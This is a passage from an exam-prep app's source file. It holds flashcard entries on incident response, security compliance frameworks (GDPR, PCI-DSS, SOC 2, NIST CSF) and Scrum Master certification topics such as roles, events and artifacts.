              'Short-term containment: isolate the affected system immediately (disconnect from network — but preserve memory if possible). Long-term containment: patch, harden, and restore services. Evidence preservation: take forensic image before wiping. Decisions: contain quickly vs. observe attacker behaviour (counterintelligence).',
          'example':
              'Exam trap: simply pulling the power on a compromised machine destroys volatile memory evidence (running processes, network connections, encryption keys). Best practice: capture memory THEN isolate (disconnect network without powering off). Order: document → capture memory → isolate → preserve disk image → eradicate.',
        },
        {
          'label': 'Incident Response',
          'term': 'Digital Forensics — Chain of Custody',
          'definition':
              'Chain of custody ensures that digital evidence is collected, handled, and preserved in a manner that maintains its integrity and admissibility in legal proceedings. Every person who handled the evidence must be documented. Evidence must be write-protected (blockers) before imaging.',
          'example':
              'Forensic imaging: use a write-blocker device when creating a forensic image of a drive. This prevents any modification to the original. Create a hash (SHA-256) of the original drive. Image the drive. Hash the image — it must match the original hash. Any discrepancy means the image is not a true copy.',
        },
        {
          'label': 'Incident Response',
          'term': 'SIEM — Security Information and Event Management',
          'definition':
              'SIEM collects log data from across the organisation (firewalls, servers, endpoints, cloud), normalises it, correlates events, and generates alerts. Use cases: detect brute force attacks (multiple failed logins), detect data exfiltration (large outbound transfers), compliance reporting. Examples: Splunk, Microsoft Sentinel, IBM QRadar.',
          'example':
              'Correlation rule: "More than 10 failed logins from the same source IP in 5 minutes followed by a successful login" → alert: possible brute force success. This correlation requires SIEM — no single log source shows both events. SIEM is the aggregation point that makes detection possible.',
        },
        {
          'label': 'Compliance',
          'term': 'GDPR — General Data Protection Regulation',
          'definition':
              'GDPR is the EU\'s data protection regulation applying to any organisation that processes EU residents\' personal data. Key requirements: lawful basis for processing, data minimisation, right of access, right to erasure, data breach notification within 72 hours, Privacy by Design. Fines: up to €20 million or 4% of global annual revenue.',
          'example':
              'Exam trap: GDPR applies to ANY organisation that processes EU citizens\' data — regardless of where the organisation is based. A US company with EU customers must comply with GDPR. The 72-hour breach notification is a specific and frequently tested requirement. "Personal data" includes names, email addresses, IP addresses.',
        },
        {
          'label': 'Compliance',
          'term': 'PCI-DSS — Payment Card Industry Data Security Standard',
          'definition':
              'PCI-DSS applies to any organisation that stores, processes, or transmits cardholder data. 12 requirements covering: network security, access control, vulnerability management, monitoring, and security policy. Levels 1-4 based on transaction volume. Non-compliance can result in fines or loss of ability to process card payments.',
          'example':
              'Key PCI-DSS requirements: no default passwords (Req 2), encrypt cardholder data in transit (Req 4), use antivirus (Req 5), restrict access by business need to know (Req 7), track all access (Req 10), regular penetration testing (Req 11). A retailer who stores full card numbers in plaintext is non-compliant.',
        },
        {
          'label': 'Compliance',
          'term': 'SOC 2 — Service Organisation Controls',
          'definition':
              'SOC 2 is an audit standard for service organisations that demonstrates security controls meeting Trust Services Criteria: Security (required), Availability, Processing Integrity, Confidentiality, and Privacy. Type I: point-in-time assessment. Type II: operational effectiveness over 6-12 months (more rigorous and valued by customers).',
          'example':
              'SOC 2 Type II is the gold standard for SaaS companies selling to enterprises. Customers ask: "Do you have SOC 2 Type II?" — it means your security controls have been independently verified to operate effectively over time, not just documented. Type I only shows controls exist at one point in time.',
        },
        {
          'label': 'Compliance',
          'term': 'NIST Cybersecurity Framework (CSF)',
          'definition':
              'NIST CSF provides a risk-based framework for managing cybersecurity. Five core functions: Identify (understand assets and risks), Protect (implement safeguards), Detect (discover cybersecurity events), Respond (take action on detected incidents), Recover (restore capabilities post-incident). Now at version 2.0 which added Govern.',
          'example':
              'NIST CSF v2.0 adds Govern as the sixth function — overarching all others. This reflects that cybersecurity must be driven by organisational governance, not just technical teams. The framework is not prescriptive — organisations choose which practices to implement based on their risk tolerance and resources.',
        },
        {
          'label': 'Incident Response',
          'term': 'Threat Intelligence',
          'definition':
              'Threat intelligence is evidence-based knowledge about existing or emerging threats. Types: Strategic (high-level trends, for executives), Tactical (TTPs — tactics, techniques, procedures, for security architects), Operational (specific campaigns, for SOC analysts), Technical (IoCs — indicators of compromise, for automated systems).',
          'example':
              'IoCs: file hashes of known malware, malicious IP addresses, suspicious domain names, registry keys created by malware. IoCs are fed into SIEM, firewalls, and EDR for automated detection. MITRE ATT&CK is the standard framework for cataloguing adversary TTPs — used for both threat intel and detection engineering.',
        },
        {
          'label': 'Exam prep',
          'term': 'Module 8 — Top Exam Traps',
          'definition':
              '1) NIST IR = 4 phases. SANS/PICERL = 6 phases. 2) Memory capture before isolation. 3) GDPR breach notification = 72 hours. 4) SOC 2 Type II > Type I (operational vs point-in-time). 5) NIST CSF v2 adds Govern. 6) Chain of custody required for forensic admissibility.',
          'example':
              'Quick-fire: What must happen within 72 hours of a GDPR breach? (Notify supervisory authority). What does SOC 2 Type II prove? (Controls operating effectively over time). What are the 5 NIST CSF functions? (Identify, Protect, Detect, Respond, Recover — plus Govern in v2). What is a write-blocker used for? (Forensic imaging without modifying evidence).',
        },
      ];

    default:
      return [
        {
          'label': 'Foundation',
          'term': 'What is Cybersecurity?',
          'definition':
              'Cybersecurity is the practice of protecting systems, networks, and data from digital attacks, damage, or unauthorised access. It is built on the CIA Triad: Confidentiality, Integrity, and Availability.',
          'example':
              'A bank uses encryption (confidentiality), checksums (integrity), and redundant systems (availability) to protect customer data and ensure services remain operational.',
        },
      ];
  }
}

    // ── CSM Fundamentals ────────────────────────────────────────────────
    if (tag == 'CSM') {
  switch (moduleId) {

    // ── Module 01: Introduction to Agile & Scrum ──────────────────────────
    case 'module-01':
      return [
        {
          'label': 'Foundation',
          'term': 'What is Agile?',
          'definition':
              'Agile is a mindset for software development that values adaptability, collaboration, and delivering working software incrementally. It is not a single methodology — it is a set of values and principles captured in the Agile Manifesto (2001). Agile replaces rigid upfront planning with iterative, feedback-driven delivery.',
          'example':
              'Exam trap: Agile is NOT a framework — it is a mindset. Scrum, Kanban, and SAFe are frameworks that implement Agile values. If a question asks "which of the following is an Agile framework?" — Agile itself is not the answer.',
        },
        {
          'label': 'Foundation',
          'term': 'The Four Agile Manifesto Values',
          'definition':
              '1) Individuals and interactions over processes and tools. 2) Working software over comprehensive documentation. 3) Customer collaboration over contract negotiation. 4) Responding to change over following a plan. The right side still has value — the left side is valued MORE.',
          'example':
              'Exam trap: The manifesto says "over" not "instead of." Documentation, plans, and contracts still matter — they are just less prioritised than collaboration and working software. An answer saying "documentation has no value in Agile" is wrong.',
        },
        {
          'label': 'Foundation',
          'term': 'The 12 Agile Principles — Key Ones to Know',
          'definition':
              'Key principles include: deliver working software frequently (weeks, not months); welcome changing requirements, even late in development; business people and developers must work together daily; build projects around motivated individuals; the best designs emerge from self-organising teams; regular reflection and adjustment is essential.',
          'example':
              'Exam scenario: A stakeholder requests a major feature change halfway through a project. An Agile team welcomes this — the principle "welcome changing requirements, even late in development" explicitly covers this. A non-Agile team would resist it.',
        },
        {
          'label': 'Foundation',
          'term': 'Waterfall vs Agile',
          'definition':
              'Waterfall is sequential: Requirements → Design → Development → Testing → Deployment. Each phase completes before the next begins. Agile is iterative: short cycles produce working software continuously, with requirements evolving throughout. Waterfall suits stable, well-understood projects. Agile suits complex, changing environments.',
          'example':
              'Waterfall: building a bridge (requirements don\'t change mid-build). Agile: building a mobile app (user feedback constantly shapes features). CSM exam questions often present a failing Waterfall scenario and ask which Agile principle resolves it.',
        },
        {
          'label': 'Foundation',
          'term': 'What is Scrum?',
          'definition':
              'Scrum is a lightweight framework for developing complex products. It uses fixed-length iterations called Sprints (1–4 weeks) to deliver potentially releasable increments. Scrum defines three accountabilities (roles), five events, and three artifacts. It is the most widely used Agile framework.',
          'example':
              'Exam trap: Scrum is a FRAMEWORK, not a methodology or process. It provides structure (events, roles, artifacts) but does not prescribe specific engineering practices. If a question calls Scrum a "methodology," that phrasing is technically imprecise — but exam answers typically use "framework."',
        },
        {
          'label': 'Core concept',
          'term': 'Empiricism — The Foundation of Scrum',
          'definition':
              'Scrum is founded on empiricism: knowledge comes from experience and decisions are based on what is known. Scrum uses three pillars to implement empiricism: Transparency (make work visible), Inspection (check progress frequently), and Adaptation (adjust when deviation is detected). All three must be present for Scrum to work.',
          'example':
              'Exam trap: Empiricism has THREE pillars — Transparency, Inspection, Adaptation (TIA). If any pillar is missing, the system breaks down. For example: if the team has Transparency and Inspection but never Adapts, problems repeat. Know all three and what happens when one is absent.',
        },
        {
          'label': 'Core concept',
          'term': 'The Five Scrum Values',
          'definition':
              'Commitment, Focus, Openness, Respect, and Courage. These values give direction to the Scrum team\'s work, behaviour, and decisions. The empirical pillars (TIA) only work when the team lives these values. An acronym: CFORC or "Commit to FORCE."',
          'example':
              'Exam scenario: A developer knows the Sprint goal is at risk but says nothing. This violates Courage (to surface difficult truths) and Openness (to make work visible). Scrum values are tested through scenario questions — identify which value is missing.',
        },
        {
          'label': 'Core concept',
          'term': 'Scrum Theory — Lean Thinking',
          'definition':
              'Scrum also draws from Lean thinking, which focuses on reducing waste and delivering only what creates value. In Scrum, this means eliminating unnecessary meetings, excessive documentation, unnecessary features (waste), and focusing work on the Sprint Goal.',
          'example':
              'A team adds a long documentation requirement to every user story "just in case." This violates Lean thinking — it is waste unless the documentation directly enables value delivery. Scrum teams continuously ask: does this activity contribute to the Sprint Goal?',
        },
        {
          'label': 'History',
          'term': 'Origins of Scrum',
          'definition':
              'Scrum was co-created by Ken Schwaber and Jeff Sutherland in the early 1990s, drawing on a 1986 Harvard Business Review article by Takeuchi and Nonaka about high-performing product teams. The Scrum Guide — the official definition of Scrum — is authored by Schwaber and Sutherland and updated periodically (most recent: 2020).',
          'example':
              'The 2020 Scrum Guide made significant changes: replaced "Development Team" with "Developers," removed the concept of "team size rules" as prescriptive, and strengthened the concept of the Scrum Team as one unit. If exam content references the 2020 Guide, know these changes.',
        },
        {
          'label': 'Exam prep',
          'term': 'Module 1 — Top Exam Traps',
          'definition':
              '1) Agile is a mindset — Scrum is a framework. 2) Manifesto says "over" not "instead of." 3) Scrum has THREE pillars (TIA) and FIVE values (CFORC). 4) Scrum is NOT prescriptive about engineering practices. 5) The Scrum Guide is the authoritative source — not any book or trainer\'s interpretation.',
          'example':
              'If a question asks about Scrum\'s foundational theory, the answer involves empiricism and its three pillars. If it asks about Scrum\'s guiding values, list all five. These are high-frequency CSM exam topics.',
        },
      ];

    // ── Module 02: The Scrum Framework ────────────────────────────────────
    case 'module-02':
      return [
        {
          'label': 'Framework',
          'term': 'The Scrum Framework — Overview',
          'definition':
              'Scrum consists of: Three Accountabilities (Product Owner, Scrum Master, Developers), Five Events (Sprint, Sprint Planning, Daily Scrum, Sprint Review, Sprint Retrospective), and Three Artifacts (Product Backlog, Sprint Backlog, Increment). Each artifact has a commitment: Product Goal, Sprint Goal, and Definition of Done respectively.',
          'example':
              'Exam trap: The 2020 Scrum Guide added explicit "commitments" to each artifact. Product Backlog → Product Goal. Sprint Backlog → Sprint Goal. Increment → Definition of Done. This is a direct exam question — know which commitment belongs to which artifact.',
        },
        {
          'label': 'Framework',
          'term': 'The Sprint — Heart of Scrum',
          'definition':
              'A Sprint is a fixed-length event of one month or less during which a usable Increment is created. Sprints have consistent durations throughout the development effort. A new Sprint begins immediately after the previous Sprint ends. No changes are made that endanger the Sprint Goal during the Sprint.',
          'example':
              'Exam trap: A Sprint is NOT just the development work — it is a container event that includes Sprint Planning, Daily Scrums, Sprint Review, and Retrospective. All events happen WITHIN the Sprint. A Sprint cannot be extended — if the Sprint Goal becomes obsolete, it can only be cancelled by the Product Owner.',
        },
        {
          'label': 'Framework',
          'term': 'Sprint Cancellation',
          'definition':
              'Only the Product Owner has the authority to cancel a Sprint. A Sprint may be cancelled if the Sprint Goal becomes obsolete — typically because the business direction changed dramatically. Cancellation is rare and traumatic for the team.',
          'example':
              'Exam trap: ONLY the Product Owner can cancel a Sprint — not the Scrum Master, not stakeholders, not management. If a question asks "who can cancel a Sprint?" the answer is always the Product Owner.',
        },
        {
          'label': 'Framework',
          'term': 'Definition of Done (DoD)',
          'definition':
              'The Definition of Done is a formal description of the state of an Increment when it meets the quality measures required for the product. Work that does not meet the DoD cannot be released. The DoD creates transparency and shared understanding of what "complete" means.',
          'example':
              'Exam trap: The DoD is the commitment for the Increment artifact. If an organisation has a DoD, all Scrum Teams must follow it as a minimum. Individual teams may have stricter DoDs but never looser ones. Work that doesn\'t meet DoD goes back to the Product Backlog — it is NOT released.',
        },
        {
          'label': 'Framework',
          'term': 'The Scrum Team',
          'definition':
              'The Scrum Team consists of one Product Owner, one Scrum Master, and Developers. It is small — typically 10 or fewer people. It is self-managing (decides how to do the work) and cross-functional (has all skills needed to create value each Sprint). There are no sub-teams or hierarchies within a Scrum Team.',
          'example':
              'Exam trap: The 2020 Scrum Guide removed specific team size guidance ("7 plus or minus 2"). Now it says "small enough to remain nimble and large enough to complete significant work." If an exam option gives a specific mandatory team size, it is outdated guidance.',
        },
        {
          'label': 'Framework',
          'term': 'Self-Managing vs Self-Organising',
          'definition':
              'The 2020 Scrum Guide replaced "self-organising" with "self-managing." Self-organising meant the team decided HOW to do the work. Self-managing is broader — the team decides who does the work, how it is done, and what to work on within the Sprint. This gives Developers more autonomy.',
          'example':
              'Exam trap: "Self-managing" is the current (2020) Scrum Guide term. "Self-organising" is the older term from previous editions. If an exam uses both terms, "self-managing" is correct for current Scrum. Know the distinction if your exam references the 2020 Guide.',
        },
        {
          'label': 'Framework',
          'term': 'Cross-Functional Teams',
          'definition':
              'A cross-functional Scrum Team has all the competencies needed to accomplish the work without depending on others outside the team. This eliminates handoffs, reduces wait time, and allows the team to deliver a complete Increment each Sprint without external blockers.',
          'example':
              'Scenario: A Scrum Team must wait for a separate QA team to test before releasing. This violates cross-functionality — the team is NOT self-sufficient. The fix is to bring QA skills into the Scrum Team so testing happens within the Sprint.',
        },
        {
          'label': 'Framework',
          'term': 'Transparency in Scrum',
          'definition':
              'Transparency means that the emergent process and work must be visible to those performing the work and those receiving it. Key transparency artefacts include the Product Backlog (visible to all stakeholders), Sprint Backlog (visible to the team), and the Increment (visible at Sprint Review).',
          'example':
              'A team hides their Sprint Backlog from stakeholders to avoid pressure. This violates Transparency — a core Scrum pillar. Scrum requires that work be visible. Hidden work prevents meaningful Inspection and breaks the empirical process.',
        },
        {
          'label': 'Framework',
          'term': 'Inspection in Scrum',
          'definition':
              'Inspection means Scrum artifacts and progress toward agreed goals must be inspected frequently to detect undesirable variances. The five Scrum events ARE the inspection points: Sprint Planning inspects the Product Backlog, Daily Scrum inspects Sprint progress, Sprint Review inspects the Increment, Retrospective inspects the team\'s process.',
          'example':
              'Exam trap: Inspection is NOT the same as management oversight or code review. It is the structured practice of examining progress toward goals at defined points (the five events). Each event serves a specific inspection purpose — know which event inspects what.',
        },
        {
          'label': 'Exam prep',
          'term': 'Module 2 — Top Exam Traps',
          'definition':
              '1) Sprint contains ALL five events — it is a container, not just development work. 2) Only the Product Owner cancels a Sprint. 3) DoD is the commitment for the Increment. 4) Teams are self-MANAGING (2020 Guide) not just self-organising. 5) Three artifacts, five events, three accountabilities — know exact counts.',
          'example':
              'Rapid-fire: How many artifacts? (3). How many events? (5). How many accountabilities? (3). What is the Sprint commitment? (Sprint Goal). What is the Increment commitment? (Definition of Done). If you hesitated on any of these, review this module.',
        },
      ];

    // ── Module 03: Scrum Roles (Accountabilities) ─────────────────────────
    case 'module-03':
      return [
        {
          'label': 'Accountability',
          'term': 'Why "Accountabilities" Not "Roles"',
          'definition':
              'The 2020 Scrum Guide replaced "roles" with "accountabilities" to emphasise that each person is accountable for specific outcomes — not just assigned job titles. A person can hold multiple accountabilities in different contexts, but within one Scrum Team, Product Owner and Scrum Master are distinct people.',
          'example':
              'Exam trap: In a single Scrum Team, the Product Owner and Scrum Master must be different people — they cannot be the same person. However, a developer at a small startup could also be the Product Owner on a DIFFERENT project. The conflict arises when both are held by one person on the SAME team.',
        },
        {
          'label': 'Accountability',
          'term': 'Product Owner — Core Accountability',
          'definition':
              'The Product Owner is accountable for maximising the value of the product resulting from the Scrum Team\'s work and for effective Product Backlog management. They are ONE person — not a committee. Their decisions are respected — if others want to change priorities, they must convince the Product Owner.',
          'example':
              'Exam trap: The Product Owner is ONE person — not a team, not a committee. If a question describes a "Product Owner team" making backlog decisions collectively, that is not valid Scrum. Decisions must be made by a single accountable person.',
        },
        {
          'label': 'Accountability',
          'term': 'Product Owner Responsibilities',
          'definition':
              'PO responsibilities include: developing and communicating the Product Goal, creating and communicating Product Backlog items, ordering the Product Backlog, and ensuring the Backlog is transparent and understood. The PO may delegate backlog management activities to others but remains accountable.',
          'example':
              'Scenario: A Product Owner asks a developer to write user stories. This is acceptable — the PO may delegate the work. But the PO remains accountable for the content, priority, and clarity of every item. Delegation does not transfer accountability.',
        },
        {
          'label': 'Accountability',
          'term': 'Scrum Master — Core Accountability',
          'definition':
              'The Scrum Master is accountable for the Scrum Team\'s effectiveness. They do this by enabling the team to improve practices within the Scrum framework, removing impediments, and serving the Product Owner, the Developers, and the organisation.',
          'example':
              'Exam trap: The Scrum Master does NOT manage the team or assign tasks. They are a servant-leader — they serve the team, not control it. If a question describes a Scrum Master directing developers on what to build, that is wrong.',
        },
        {
          'label': 'Accountability',
          'term': 'Scrum Master — Services to the Team',
          'definition':
              'The Scrum Master serves the Scrum Team by coaching in self-management and cross-functionality, helping focus on high-value increments, removing impediments, and facilitating Scrum events. They serve the Product Owner by helping manage the Product Backlog effectively.',
          'example':
              'Scenario: The database team will not provide access to the Scrum Team for two weeks, blocking the Sprint. The Scrum Master escalates and resolves this impediment — that is their accountability. A Scrum Master who "notes the impediment" but takes no action is failing in their role.',
        },
        {
          'label': 'Accountability',
          'term': 'Scrum Master — Services to the Organisation',
          'definition':
              'The Scrum Master also serves the wider organisation by: leading, training, and coaching Scrum adoption; planning and advising on Scrum implementations; helping employees and stakeholders understand Scrum; and removing barriers between stakeholders and Scrum Teams.',
          'example':
              'Exam scenario: Management keeps interrupting Developers mid-Sprint with urgent requests. The Scrum Master works with management to route requests through the Product Owner and protect the team\'s focus. This is serving the organisation — not just the team.',
        },
        {
          'label': 'Accountability',
          'term': 'Developers — Core Accountability',
          'definition':
              'Developers are accountable for creating a usable Increment each Sprint. They are the people committed to creating any aspect of a usable Increment each Sprint. "Developers" does not mean only software engineers — it includes everyone doing the work: designers, testers, analysts, etc.',
          'example':
              'Exam trap: "Developers" in Scrum is NOT a job title — it is a Scrum accountability. A UX designer, business analyst, and QA engineer on a Scrum Team are all "Developers" in Scrum terminology. If a question implies only coders are Developers, that is wrong.',
        },
        {
          'label': 'Accountability',
          'term': 'Developer Responsibilities',
          'definition':
              'Developers are responsible for: creating a plan for the Sprint (Sprint Backlog), instilling quality by adhering to the Definition of Done, adapting their plan each day toward the Sprint Goal, and holding each other accountable as professionals.',
          'example':
              'Scenario: A Developer notices a colleague\'s code does not meet the Definition of Done. The Developer is accountable for raising this — "holding each other accountable as professionals" is an explicit Scrum responsibility. Ignoring it to avoid conflict undermines the Increment.',
        },
        {
          'label': 'Misconception',
          'term': 'Common Misconception: The Scrum Master Is the Team Lead',
          'definition':
              'The Scrum Master has no authority over the Developers. They do not assign tasks, make technical decisions, or have hiring/firing power. They are a facilitator and coach. In some organisations, the Scrum Master role is confused with a project manager — this is a fundamental misapplication of Scrum.',
          'example':
              'If a manager asks "who is responsible for the team\'s output?" in a Scrum context — the answer is the TEAM (Developers), not the Scrum Master. The Scrum Master is responsible for the team\'s EFFECTIVENESS (process), not its output (product).',
        },
        {
          'label': 'Exam prep',
          'term': 'Module 3 — Top Exam Traps',
          'definition':
              '1) PO and SM must be different people on the same team. 2) PO is ONE person — never a committee. 3) SM is a servant-leader, not a manager. 4) "Developers" includes all disciplines doing the work — not just coders. 5) SM cannot be held accountable for what the team builds — only for process effectiveness.',
          'example':
              'Scenario practice: "The Scrum Master tells the team which tasks to work on each day." Violation: SM has no authority over task assignment. "The Product Owner committee votes on backlog priority." Violation: PO must be a single person. Identify the violation type for each.',
        },
      ];

    // ── Module 04: Scrum Events ────────────────────────────────────────────
    case 'module-04':
      return [
        {
          'label': 'Events Overview',
          'term': 'The Five Scrum Events',
          'definition':
              'Scrum defines five formal events: 1) The Sprint (container for all other events), 2) Sprint Planning, 3) Daily Scrum, 4) Sprint Review, 5) Sprint Retrospective. Each event is an opportunity for Inspection and Adaptation. All events are time-boxed — they have a maximum duration.',
          'example':
              'Exam trap: The Sprint is itself an event — it contains the other four events. So there are five events total, not four. The Sprint is a container event. All other events occur WITHIN the Sprint.',
        },
        {
          'label': 'Event',
          'term': 'Sprint Planning — Purpose and Time-box',
          'definition':
              'Sprint Planning initiates the Sprint by defining the work to be done. It addresses: Why is this Sprint valuable? (Sprint Goal), What can be done? (items selected from Product Backlog), How will chosen work get done? (plan created by Developers). Time-box: maximum 8 hours for a one-month Sprint (proportionally less for shorter Sprints).',
          'example':
              'Exam trap: Sprint Planning answers THREE questions — why (goal), what (selection), how (plan). All three must be addressed. A Sprint Planning that only selects items without creating a Sprint Goal or a plan is incomplete. The Sprint Goal is created DURING Sprint Planning — it is not set beforehand.',
        },
        {
          'label': 'Event',
          'term': 'Sprint Goal',
          'definition':
              'The Sprint Goal is the single objective for the Sprint. It gives the Developers flexibility in the exact work needed to achieve it. If work turns out different than expected, the team collaborates with the Product Owner to renegotiate scope — but the Sprint Goal remains fixed.',
          'example':
              'Scenario: Halfway through the Sprint, a Developer discovers the planned approach won\'t work. They talk to the PO and adjust WHICH items to complete — but the Sprint Goal stays the same. The goal is fixed; the plan is flexible. This is a key Scrum concept tested frequently.',
        },
        {
          'label': 'Event',
          'term': 'Daily Scrum — Purpose and Time-box',
          'definition':
              'The Daily Scrum is a 15-minute event for the Developers to inspect progress toward the Sprint Goal and adapt the Sprint Backlog as necessary. It is held at the same time and place every day. The Scrum Master does NOT run it — the Developers own it.',
          'example':
              'Exam trap: The Daily Scrum is for DEVELOPERS only — not the Product Owner, not stakeholders, not management. The Scrum Master may attend to coach but does not facilitate it as their primary role. The three classic questions ("what did I do, what will I do, blockers") are common practice but NOT required by the Scrum Guide.',
        },
        {
          'label': 'Event',
          'term': 'Daily Scrum — What It Is NOT',
          'definition':
              'The Daily Scrum is not a status meeting for management. It is not a problem-solving session (issues are taken offline). It is not a reporting mechanism for the Scrum Master. Its sole purpose is for Developers to inspect Sprint Goal progress and adapt their plan.',
          'example':
              'Scenario: During the Daily Scrum, the manager asks each developer to report what they accomplished yesterday. This is misuse — it is a management status update, not a Scrum event. The Daily Scrum serves the TEAM\'S planning needs, not management\'s reporting needs.',
        },
        {
          'label': 'Event',
          'term': 'Sprint Review — Purpose and Time-box',
          'definition':
              'The Sprint Review is held at the end of the Sprint to inspect the Increment and adapt the Product Backlog if needed. The Scrum Team and stakeholders collaborate on what was accomplished and what to do next. It is a working session — not a demonstration or presentation. Time-box: maximum 4 hours for a one-month Sprint.',
          'example':
              'Exam trap: The Sprint Review is NOT a demo or sign-off meeting — it is a collaborative working session. Stakeholders actively participate in shaping what comes next. The Product Backlog may be adjusted based on what is learned. Treating it as a "show and tell" misses its adaptive purpose.',
        },
        {
          'label': 'Event',
          'term': 'Sprint Retrospective — Purpose and Time-box',
          'definition':
              'The Sprint Retrospective is the last event of the Sprint. The team inspects how the last Sprint went with regard to individuals, interactions, processes, tools, and their Definition of Done. They identify improvements and add the most impactful ones to the NEXT Sprint. Time-box: maximum 3 hours for a one-month Sprint.',
          'example':
              'Exam trap: The Retrospective focuses on PROCESS — how the team works together — not the PRODUCT (what was built). Sprint Review = inspect the product. Retrospective = inspect the process. Mixing these up is a common exam mistake. Improvements identified should appear in the NEXT Sprint Backlog.',
        },
        {
          'label': 'Event',
          'term': 'Sprint Review vs Sprint Retrospective',
          'definition':
              'Sprint Review: who attends = Scrum Team + stakeholders. Focus = product increment and future direction. Output = adapted Product Backlog. Sprint Retrospective: who attends = Scrum Team only (no stakeholders). Focus = team process and practices. Output = improvement actions for next Sprint.',
          'example':
              'Scenario: A stakeholder requests to join the Retrospective to give feedback on team process. They should NOT attend — the Retrospective is for the Scrum Team only. Stakeholders give product feedback at the Sprint Review. Process feedback belongs exclusively to the team.',
        },
        {
          'label': 'Event',
          'term': 'Time-boxes — Summary',
          'definition':
              'Sprint: 1–4 weeks (chosen by team). Sprint Planning: max 8 hours (1-month Sprint). Daily Scrum: 15 minutes (every day). Sprint Review: max 4 hours (1-month Sprint). Sprint Retrospective: max 3 hours (1-month Sprint). For shorter Sprints, time-boxes are proportionally shorter.',
          'example':
              'Exam question: "A team running 2-week Sprints needs to time-box their Sprint Planning. What is the maximum?" Answer: approximately 4 hours (half of the 8-hour maximum for a 1-month Sprint). Proportional calculation is tested.',
        },
        {
          'label': 'Exam prep',
          'term': 'Module 4 — Top Exam Traps',
          'definition':
              '1) Sprint CONTAINS all other events — 5 events total. 2) Daily Scrum = 15 min, Developers only, not a status meeting. 3) Sprint Review = product + stakeholders. Retrospective = process + team only. 4) Sprint Goal is fixed; sprint scope can flex. 5) Sprint Planning answers WHY, WHAT, and HOW.',
          'example':
              'Quick-fire: Who attends the Retrospective? (Scrum Team only). Who attends the Sprint Review? (Scrum Team + stakeholders). What is the output of Sprint Planning? (Sprint Goal + Sprint Backlog). What is the max time-box for Sprint Review in a 2-week Sprint? (2 hours).',
        },
      ];

    // ── Module 05: Scrum Artifacts ────────────────────────────────────────
    case 'module-05':
      return [
        {
          'label': 'Artifacts Overview',
          'term': 'The Three Scrum Artifacts and Their Commitments',
          'definition':
              'Scrum defines three artifacts: Product Backlog (commitment: Product Goal), Sprint Backlog (commitment: Sprint Goal), and Increment (commitment: Definition of Done). Artifacts represent work or value and are designed to maximise transparency. Each commitment provides a benchmark for measuring progress.',
          'example':
              'Exam trap: Every artifact has a specific commitment — this was formalised in the 2020 Scrum Guide. Product Backlog → Product Goal. Sprint Backlog → Sprint Goal. Increment → DoD. If a question asks "what is the commitment for the Sprint Backlog?" the answer is the Sprint Goal, not the DoD.',
        },
        {
          'label': 'Artifact',
          'term': 'Product Backlog',
          'definition':
              'The Product Backlog is an emergent, ordered list of what is needed to improve the product. It is the single source of work for the Scrum Team. It is never complete — it evolves as the product and market evolve. The Product Owner is accountable for its content, availability, and ordering.',
          'example':
              'Exam trap: The Product Backlog is ORDERED — not prioritised. The Scrum Guide deliberately uses "ordered" (by the PO based on value, risk, dependencies) rather than "prioritised" (which implies a simple high/medium/low ranking). The distinction is subtle but can appear in exam options.',
        },
        {
          'label': 'Artifact',
          'term': 'Product Backlog Refinement',
          'definition':
              'Product Backlog Refinement is the act of breaking down and defining Product Backlog items into smaller, more precise items. This is an ongoing activity — not an official Scrum event. Developers and the PO collaborate to add detail, estimates, and order. Items at the top should be ready for the next Sprint Planning.',
          'example':
              'Exam trap: Refinement is NOT an official Scrum event — it is an ongoing activity. It has no mandatory time-box. The Scrum Guide suggests spending no more than 10% of the team\'s capacity on refinement, but this is guidance, not a rule.',
        },
        {
          'label': 'Artifact',
          'term': 'Sprint Backlog',
          'definition':
              'The Sprint Backlog is composed of: the Sprint Goal (why), the set of Product Backlog items selected for the Sprint (what), and a plan for delivering the Increment (how). It is owned by the Developers — only they can change it during the Sprint. It is a real-time picture of Sprint work.',
          'example':
              'Exam trap: Only DEVELOPERS can change the Sprint Backlog during the Sprint — not the Product Owner, not the Scrum Master. The PO can negotiate scope with Developers, but cannot unilaterally add or remove Sprint Backlog items. This protects the team\'s focus.',
        },
        {
          'label': 'Artifact',
          'term': 'The Increment',
          'definition':
              'An Increment is a concrete stepping stone toward the Product Goal. Each Increment must meet the Definition of Done. Multiple Increments may be created within a Sprint. The Increment must be usable — the Product Owner may choose not to RELEASE it, but it must be RELEASABLE.',
          'example':
              'Exam trap: An Increment must meet the DoD to be considered an Increment. Work that does not meet the DoD is NOT an Increment — it returns to the Product Backlog. The Product Owner decides whether to RELEASE the Increment, but cannot decide whether something "counts" as an Increment if it violates DoD.',
        },
        {
          'label': 'Artifact',
          'term': 'Product Goal',
          'definition':
              'The Product Goal describes a future state of the product and serves as the long-term objective for the Scrum Team. It is the commitment for the Product Backlog. The Scrum Team should complete or abandon one Product Goal before taking on another.',
          'example':
              'Scenario: A startup is building a fitness app. Product Goal: "Become the top-rated workout tracking app for home athletes in 12 months." Every sprint, the Product Backlog is curated to move closer to this goal. Sprints without clear connection to the Product Goal are wasted effort.',
        },
        {
          'label': 'Artifact',
          'term': 'Definition of Done vs Acceptance Criteria',
          'definition':
              'The Definition of Done applies to ALL Increments — it is the minimum quality bar every piece of work must meet. Acceptance Criteria are specific to individual Product Backlog items — they define what "done" means for THAT specific item. An item can meet its Acceptance Criteria but still fail DoD.',
          'example':
              'DoD: all code reviewed, tests passing, security scan clean, deployed to staging. Acceptance Criteria for a login feature: user can log in with email/password, failed logins show error messages. Both must be met for the item to be releasable. DoD is the floor; AC defines the specific behaviour.',
        },
        {
          'label': 'Artifact',
          'term': 'Backlog Item Formats — User Stories',
          'definition':
              'User stories are a common format for Product Backlog items: "As a [user type], I want [goal], so that [reason]." They are a tool — not a Scrum requirement. The Scrum Guide does not mandate user stories. They help keep focus on value from the user\'s perspective rather than technical task descriptions.',
          'example':
              'Exam trap: User stories are NOT part of the Scrum framework — they are a complementary practice. The CSM exam may test this. If a question asks "what does the Scrum Guide require as the format for Product Backlog items?" the answer is: nothing specific — any format that conveys value is acceptable.',
        },
        {
          'label': 'Artifact',
          'term': 'Estimation in Scrum',
          'definition':
              'The Scrum Guide does not mandate any specific estimation technique. Story points, hours, T-shirt sizes, or no estimates at all (#NoEstimates) are all compatible with Scrum. Developers are responsible for estimation — the PO or Scrum Master cannot override Developer estimates.',
          'example':
              'Exam trap: The Product Owner CANNOT change a Developer\'s estimate. Only the people doing the work can estimate it. If a PO says "I need this to be a 1-point story, not 5 points" — they are overstepping. POs influence priority; Developers own estimates.',
        },
        {
          'label': 'Exam prep',
          'term': 'Module 5 — Top Exam Traps',
